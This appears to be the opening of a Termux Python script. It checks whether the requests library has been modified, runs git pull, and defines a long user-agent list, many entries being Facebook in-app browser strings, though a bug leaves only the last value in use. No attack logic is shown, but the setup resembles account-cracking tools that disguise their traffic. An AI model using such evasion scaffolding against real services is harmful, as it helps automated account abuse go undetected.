import requests,bs4,json,os,sys,random,datetime,time,re,uuid
import urllib3,rich,base64
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import pretty
from rich.text import Text as tekz
from time import localtime as lt
pretty.install()
CON=sol()
if not len(open('/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/models.py','r').readlines())==1034:print('Bypass User')
import os, platform, time, sys
os.system ('termux-setup-storage -y')
os.system('clear')
print('\x1b[38;5;46mCHECKING UPDATE...? ')
os.system("espeak -a 300 \"Checking,Update,\"")
time.sleep(1)
os.system('git pull')
#------------------[ USER-AGENT ]-------------------#
ua = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",]
ua = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/120.0.2210.144",]
ua = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64; Xbox; Xbox One) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edge/44.18363.8131",]
ua = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/122.0",]
ua = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:115.0) Gecko/20100101 Firefox/115.0",]
ua = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 OPR/106.0.0.0",]
ua = ["Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 OPR/106.0.0.0",]
ua = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.3",]
ua = ["Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.",]
ua = ["Mozilla/5.0 (iPad; CPU OS 14_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/122.0 Mobile/15E148 Safari/605.1.15",]
ua = ["Mozilla/5.0 (iPad; CPU OS 17_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1"]
ua = ["Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.101 Mobile Safari/537.36"]
ua = ["Mozilla/5.0 (Linux; Android 10; HD1913) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.101 Mobile Safari/537.36 EdgA/120.0.2210.141"]
ua = ["Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.101 Mobile Safari/537.36 EdgA/120.0.2210.141"]
ua = ["Mozilla/5.0 (Linux; Android 10; ONEPLUS A6003) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.101 Mobile Safari/537.36 EdgA/120.0.2210.141"]
ua = ["Mozilla/5.0 (Windows Mobile 10; Android 10.0; Microsoft; Lumia 950XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36 Edge/40.15254.603"]
ua = ["Mozilla/5.0 (Android 14; Mobile; LG-M255; rv:122.0) Gecko/122.0 Firefox/122.0"]
ua = ["Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 EdgiOS/120.2210.150 Mobile/15E148 Safari/605.1.15"]
ua = ["Mozilla/5.0 (Linux; Android 10; SM-N975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.101 Mobile Safari/537.36 OPR/76.2.4027.73374"]
ua = ["Mozilla/5.0 (Symbian/3; Series60/5.2 NokiaN8-00/012.002; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/533.4 (KHTML, like Gecko) NokiaBrowser/7.3.0 Mobile Safari/533.4 3gpp-gba"]
ua = ["Mozilla/5.0 (Linux; Android 11; Nokia G10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.58 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (iPhone; CPU iPhone OS 15_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/19D52",]
ua = ["Mozilla/5.0 (Linux; Android 8.0.0; SM-J330G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.58 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 10; M2006C3LG Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/98.0.4758.101 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 11; moto g(40) fusion Build/RRI31.Q1-42-51-12; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 10; SM-A405FN Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 11; SM-A127F Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 13; SM-S918B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 12; SM-A115F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 12; CRT-LX2 Build/HONORCRT-L32; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 12; ANG-AN00 Build/HUAWEIANG-AN00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4515.105 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 10; NEO-AL00 Build/HUAWEINEO-AL00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 13; Infinix X6710 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 12; Infinix X676B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 11; Infinix X6816D Build/RP1A.201005.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 8.0.0; LLD-AL20) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 8.0.0; SM-J600GT) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.111 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 10; Redmi 5 Plus) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.96 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 9; SM-J701MT) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.111 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 7.1.1; SM-T560NU) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.111 Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 11; Nokia G10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.58 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (iPhone; CPU iPhone OS 15_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/19D52",]
ua = ["Mozilla/5.0 (Linux; Android 8.0.0; SM-J330G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.58 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 10; M2006C3LG Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/98.0.4758.101 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 11; moto g(40) fusion Build/RRI31.Q1-42-51-12; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 12; SM-M315F Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) VenusBrowser/3.2.42 Chrome/113.0.5672.162 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 13; SM-A127F Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/434.0.0.36.115",]
ua = ["Mozilla/5.0 (Linux; Android 10; SM-J400F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36[FBAN/EMA;FBLC/en_GB;FBAV/374.0.0.10.114",]
ua = ["Mozilla/5.0 (Linux; Android 12; Infinix X668C Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/435.0.0.42.112",]
ua = ["Mozilla/5.0 (Linux; Android 12; Infinix X6827 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 12; Infinix X676B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/434.0.0.36.115",]
ua = ["Mozilla/5.0 (Linux; Android 13; V2172A Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113",]
ua = ["Mozilla/5.0 (Linux; Android 10; V2002A Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.65 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/401.0.0.24.77",]
ua = ["Mozilla/5.0 (Linux; Android 11; I2012 Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/432.0.0.29.102",]
ua = ["Mozilla/5.0 (Linux; Android 4.4.2; GT-S7562L Build/JSS15J) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/33.0.0.0 Mobile Safari/537.36 Viber/11.6.2.4",]
ua = ["Mozilla/5.0 (Linux; U; Android 4.0.4; en-gb; GT-S7562 Build/IMM76I) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30",]
ua = ["Mozilla/5.0 (Linux; U; Android 4.0.4; en-gb; GT-S7562i Build/IMM76I) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30",]
ua = ["Mozilla/5.0 (Linux; U; Android 4.0.4; en-gb; GT-S7562L Build/IMM76I) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30",]
ua = ["Mozilla/5.0 (Linux; Android 12; SM-M315F Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) VenusBrowser/3.2.42 Chrome/113.0.5672.162 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 13; SM-A127F Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/434.0.0.36.115",]
ua = ["Mozilla/5.0 (Linux; Android 10; SM-J400F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36[FBAN/EMA;FBLC/en_GB;FBAV/374.0.0.10.114",]
ua = ["Mozilla/5.0 (Linux; Android 12; Infinix X668C Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/435.0.0.42.112",]
ua = ["Mozilla/5.0 (Linux; Android 12; Infinix X6827 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 12; Infinix X676B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/434.0.0.36.115",]
ua = ["Mozilla/5.0 (Linux; Android 13; V2172A Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113",]
ua = ["Mozilla/5.0 (Linux; Android 10; V2002A Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.65 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/401.0.0.24.77",]
ua = ["Mozilla/5.0 (Linux; Android 11; I2012 Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/432.0.0.29.102",]
ua = ["Mozilla/5.0 (Linux; Android 11; RMX3121 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/434.0.0.36.115",]
ua = ["Mozilla/5.0 (Linux; Android 12;CPH2365 Build/RKQ1.211119.001; wv)AppleWebKit/537.36 (KHTML, like Gecko)Version/4.0 Chrome/103.0.5060.129Mobile Safari/537.36 [FB_IAB/OrcaAndroid;FBAV/372.0.0.10.112;",]
ua = ["Mozilla/5.0 (Linux; U; Android 10;Device HUAWEI Mate 20 lite)AppleWebkit/534.30 (KHTML, likeGecko) Version/4.0 Mobile Safari534.30 Spotify/860200774 (6; 2; 7)",]
ua = ["Mozilla/5.0 (Linux; Android 7.1.2; Redmi 5A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.364.",]
ua = ["Mozilla/5.0 (Linux; Android 9; itel L5503 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/79.0.3945.116 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/320.0.0.12.108;",]
ua = ["Mozilla/5.0 (Linux; Android 11; RMX3511 Build/RP1A.201005.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/94.0.4606.85 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/369.0.0.18.103;",]
ua = ["Mozilla/5.0 (Linux; Android 10; SM-M215F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; U; Android 12; en-US; TECNO KI5k Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.108 UCBrowser/13.5.5.1313 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 10; Z30 pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 9; Infinix X604) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4652.156 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 8.1.0; LH9810) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36,gzip(gfe)",]
ua = ["Mozilla/5.0 (Linux; Android 13; SM-S901B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 7.1.2; Redmi Note 5A Prime Build/N2G47H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Mobile Safari/537.36 YaApp_Android/10.61 YaSearchBrowser/10.61",]
ua = ["Mozilla/5.0 (Linux; Android 10; REALME RMX1911 Build/NMF26F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.111 Mobile Safari/537.36 AlohaBrowser/2.20.3",]
ua = ["Mozilla/5.0 (Linux; Android 12; RMX3371 Build/RKQ1.211119.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/118.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/438.0.0.33.118;",]
ua = ["Mozilla/5.0 (Linux; Android 11; RMX3506 Build/RP1A.201005.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/97.0.4692.98 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/436.0.0.35.101;",]
ua = ["Mozilla/5.0 (Linux; Android 13; RMX3760 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/438.0.0.33.118;",]
ua = ["Mozilla/5.0 (Linux; Android 13; RMX3311 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/436.0.0.35.101;",]
ua = ["Mozilla/5.0 (Linux; Android 13; SM-A037U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 10; SAMSUNG SM-N960F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/21.0 Chrome/110.0.5481.154 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 13; 23030RAC7Y Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/118.0.0.0 Mobile Safari/537.36[FBAN/EMA;FBLC/es_ES;FBAV/378.0.0.12.118;",]
ua = ["Mozilla/5.0 (Linux; Android 13; 2210129SG Build/TKQ1.220829.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/118.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/438.0.0.34.118;",]
ua = ["Mozilla/5.0 (Linux; Android 11; 2209116AG Build/RKQ1.200826.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/435.0.0.42.112;",]
ua = ["Mozilla/5.0 (Linux; Android 13; 2210129SG Build/TKQ1.220829.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/436.0.0.35.101;",]
ua = ["Mozilla/5.0 (Linux; Android 11; RMX3121 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/434.0.0.36.115",]
ua = ["Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/37.0.2062.94 Chrome/37.0.2062.94 Safari/537.36",]
ua = ["Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",]
ua = ["Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",]
ua = ["Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0",]
ua = ["Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/600.8.9 (KHTML, like Gecko) Version/8.0.8 Safari/600.8.9",]
ua = ["Mozilla/5.0 (iPad; CPU OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H321 Safari/600.1.4",]
ua = ["Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",]
ua = ["Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",]
ua = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.10240",]
ua = ["Mozilla/5.0 (Windows NT 6.3; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0",]
ua = ["Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko",]
ua = ["Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",]
ua = ["Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko",]
ua = ["Mozilla/5.0 (Windows NT 10.0; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0",]
ua = ["Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/600.7.12 (KHTML, like Gecko) Version/8.0.7 Safari/600.7.12",]
ua = ["Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",]
ua = ["Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:40.0) Gecko/20100101 Firefox/40.0",]
ua = ["Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/600.8.9 (KHTML, like Gecko) Version/7.1.8 Safari/537.85.17",]
ua = ["Mozilla/5.0 (iPad; CPU OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H143 Safari/600.1.4",]
ua = ["Mozilla/5.0 (iPad; CPU OS 8_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12F69 Safari/600.1.4",]
ua = ["Mozilla/5.0 (Windows NT 6.1; rv:40.0) Gecko/20100101 Firefox/40.0",]
ua = ["Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)",]
ua = ["Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)",]
ua = ["Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; Touch; rv:11.0) like Gecko",]
ua = ["Mozilla/5.0 (Windows NT 5.1; rv:40.0) Gecko/20100101 Firefox/40.0",]
ua = ["Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",]
ua = ["Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/600.6.3 (KHTML, like Gecko) Version/8.0.6 Safari/600.6.3",]
ua = ["Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/600.5.17 (KHTML, like Gecko) Version/8.0.5 Safari/600.5.17",]
ua = ["Mozilla/5.0 (Windows NT 6.1; WOW64; rv:38.0) Gecko/20100101 Firefox/38.0",]
ua = ["Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",]
ua = ["Mozilla/5.0 (iPhone; CPU iPhone OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H321 Safari/600.1.4",]
ua = ["Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko",]
ua = ["Mozilla/5.0 (iPad; CPU OS 7_1_2 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) Version/7.0 Mobile/11D257 Safari/9537.53",]
ua = ["Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)",]
ua = ["Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",]
ua = ["Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",]
ua = ["Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:40.0) Gecko/20100101 Firefox/40.0",]
ua = ["Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)",]
ua = ["Mozilla/5.0 (Windows NT 6.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",]
ua = ["Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",]
ua = ["Mozilla/5.0 (X11; CrOS x86_64 7077.134.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.156 Safari/537.36",]
ua = ["Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/600.7.12 (KHTML, like Gecko) Version/7.1.7 Safari/537.85.16",]
ua = ["Mozilla/5.0 (Windows NT 6.0; rv:40.0) Gecko/20100101 Firefox/40.0",]
ua = ["Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:40.0) Gecko/20100101 Firefox/40.0",]
ua = ["Mozilla/5.0 (iPad; CPU OS 8_1_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B466 Safari/600.1.4",]
ua = ["Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/600.3.18 (KHTML, like Gecko) Version/8.0.3 Safari/600.3.18",]
ua = ["Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",]
ua = ["Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",]
ua = ["Mozilla/5.0 (Windows NT 6.1; Win64; x64; Trident/7.0; rv:11.0) like Gecko",]
ua = ["Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",]
ua = ["Mozilla/5.0 (iPad; CPU OS 8_1_2 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B440 Safari/600.1.4",]
ua = ["Mozilla/5.0 (Linux; U; Android 4.0.3; en-us; KFTT Build/IML74K) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/537.36",]
ua = ["Mozilla/5.0 (iPad; CPU OS 8_2 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12D508 Safari/600.1.4",]
ua = ["Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",]
ua = ["Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",]
ua = ["Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; Touch; rv:11.0) like Gecko",]
ua = ["Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:40.0) Gecko/20100101 Firefox/40.0",]
ua = ["Mozilla/5.0 (Windows NT 6.1; WOW64; rv:31.0) Gecko/20100101 Firefox/31.0",]
ua = ["Mozilla/5.0 (iPhone; CPU iPhone OS 8_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12F70 Safari/600.1.4",]
ua = ["Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; MATBJS; rv:11.0) like Gecko",]
